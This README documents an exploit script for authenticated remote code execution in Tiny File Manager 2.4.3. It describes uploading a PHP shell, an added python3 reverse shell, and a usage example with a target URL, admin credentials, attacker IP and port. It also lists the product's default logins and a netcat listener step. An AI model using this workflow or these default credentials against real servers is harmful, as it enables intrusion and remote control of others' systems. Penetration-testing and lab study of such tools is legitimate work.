# Tiny File Manager 2.4.3 RCE v2
Just a simple script, created by FEBIN MON SAJI (https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) and modified by me that uploads a php shell and executes arbitrary code on the remote vulnerable server.

### Changes:
  - Added python3 reverse shell functionality. 
  - Added another uploading method: Now, it checks if the original upload has been successful and, if not, tries another location using other params.
  - Added cleaning stuff and some style changes

### Use:

        Tiny File Manager Authenticated RCE POC Exploit - V2.

        By FEBIN - Modified by W1s3m4n

        ./exploit.sh <URL> <Admin Username> <Password> <LocalIP> <LocalPort>

        Example: ./exploit.sh http://files.ubuntu.local/tinyfilemanager.php admin "admin@123" 10.10.14.111 2319

        Default creds:
                - admin:admin@123
                - user/12345

        SHELL: Open a netcat listener on LocalIP and LocalPort for python3 reverse shell


  
 
